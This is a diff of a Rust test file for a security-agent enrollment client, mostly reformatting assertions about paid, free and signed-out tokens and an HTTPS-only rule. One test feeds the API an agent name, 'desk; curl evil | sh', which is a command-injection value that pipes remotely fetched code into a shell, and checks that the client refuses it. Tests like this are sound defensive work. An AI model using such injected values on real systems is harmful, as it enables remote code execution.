@@ -11,7 +11,10 @@ use ramwarden_wazuh::{Cloud, EnrollRequest, Error};
 use serde_json::{Value, json};
 
 fn token_of(h: &HeaderMap) -> String {
-    h.get("authorization").and_then(|v| v.to_str().ok()).unwrap_or("").to_string()
+    h.get("authorization")
+        .and_then(|v| v.to_str().ok())
+        .unwrap_or("")
+        .to_string()
 }
 
 async fn serve(enrollment: Value) -> String {
@@ -79,9 +82,18 @@ async fn enrols_a_paid_device_and_reads_triaged_alerts() {
 #[tokio::test]
 async fn no_pass_and_signed_out_are_told_apart() {
     let base = serve(good()).await;
-    assert!(matches!(cloud(&base, "free").enroll(&EnrollRequest::here()).await, Err(Error::NoPass)));
-    assert!(matches!(cloud(&base, "stale").enroll(&EnrollRequest::here()).await, Err(Error::SignedOut)));
-    assert!(matches!(cloud(&base, "stale").status().await, Err(Error::SignedOut)));
+    assert!(matches!(
+        cloud(&base, "free").enroll(&EnrollRequest::here()).await,
+        Err(Error::NoPass)
+    ));
+    assert!(matches!(
+        cloud(&base, "stale").enroll(&EnrollRequest::here()).await,
+        Err(Error::SignedOut)
+    ));
+    assert!(matches!(
+        cloud(&base, "stale").status().await,
+        Err(Error::SignedOut)
+    ));
 }
 
 #[tokio::test]
@@ -89,11 +101,21 @@ async fn an_unsafe_enrollment_from_the_api_is_refused() {
     let mut bad = good();
     bad["agent_name"] = json!("desk; curl evil | sh");
     let base = serve(bad).await;
-    assert!(matches!(cloud(&base, "paid").enroll(&EnrollRequest::here()).await, Err(Error::Parse(..))));
+    assert!(matches!(
+        cloud(&base, "paid").enroll(&EnrollRequest::here()).await,
+        Err(Error::Parse(..))
+    ));
 }
 
 #[test]
 fn the_hosted_api_must_be_https() {
     assert!(Cloud::new("http://api.ramwarden.com", Secret::new("t"), Duration::ZERO).is_err());
-    assert!(Cloud::new("https://api.ramwarden.com", Secret::new("t"), Duration::ZERO).is_ok());
+    assert!(
+        Cloud::new(
+            "https://api.ramwarden.com",
+            Secret::new("t"),
+            Duration::ZERO
+        )
+        .is_ok()
+    );
 }
